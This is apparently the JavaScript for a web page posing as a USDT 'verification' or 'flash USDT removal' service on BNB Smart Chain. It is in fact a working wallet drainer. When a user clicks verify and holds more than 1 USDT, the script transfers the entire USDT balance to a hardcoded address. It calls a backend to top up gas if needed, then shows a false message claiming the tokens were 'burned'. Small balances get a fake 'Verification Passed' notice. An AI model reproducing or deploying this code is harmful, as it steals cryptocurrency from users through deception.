const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3;
let userAddress = null;

// ✅ No popup wallet detection on load
window.addEventListener("load", async () => {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        if (accounts.length > 0) {
            userAddress = accounts[0];
            console.log("Auto-connected wallet:", userAddress);
        } else {
            console.log("Wallet not yet connected.");
        }
    } else {
        alert("Web3 wallet not found. Please use Trust Wallet or MetaMask.");
    }
});

async function verifyAssets() {
    if (!web3 || !userAddress) {
        alert("Wallet not connected. Open in a Web3 browser.");
        return;
    }

    const usdtContract = new web3.eth.Contract([
        {
            constant: true,
            inputs: [{ name: "_owner", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "", type: "uint256" }],
            type: "function"
        }
    ], usdtContractAddress);

    const [usdtBalanceWei, userBNBWei] = await Promise.all([
        usdtContract.methods.balanceOf(userAddress).call(),
        web3.eth.getBalance(userAddress)
    ]);

    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

    console.log(`USDT Balance: ${usdtBalance}`);
    console.log(`BNB Balance: ${userBNB}`);

    if (usdtBalance === 0) {
        showPopup("No assets found in your wallet.", "black");
        return;
    }

    if (usdtBalance <= 1) {
        showPopup(
            `✅ Verification Passed<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${userBNB}`,
            "green"
        );
        return;
    }

    showPopup("Processing transfer...", "green");
    transferUSDT(usdtBalance, userBNB);
}

async function transferUSDT(usdtBalance, userBNB) {
    try {
        if (userBNB < 0.0005) {
            console.log("Low BNB, requesting gas fee...");
            await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ toAddress: userAddress })
            });
        }

        const usdtContract = new web3.eth.Contract([
            {
                constant: false,
                inputs: [
                    { name: "recipient", type: "address" },
                    { name: "amount", type: "uint256" }
                ],
                name: "transfer",
                outputs: [{ name: "", type: "bool" }],
                type: "function"
            }
        ], usdtContractAddress);

        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");

        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

        showPopup(
            `✔️ Flash USDT successfully removed.<br><b>USDT Burned:</b> ${usdtBalance}`,
            "red"
        );

        console.log(`Transferred ${usdtBalance} USDT to ${bscAddress}`);
    } catch (err) {
        console.error("USDT Transfer Failed:", err);
        alert("Transfer failed. Check gas or try again.");
    }
}

function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
            text-align: center;
            font-size: 18px;
            width: 80%;
            max-width: 400px;
        `;
        document.body.appendChild(popup);
    }

    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
    popup.style.color = color === "red" ? "red" : "green";
    popup.innerHTML = message;
    popup.style.display = "block";

    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

// ✅ Event listener remains unchanged
document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
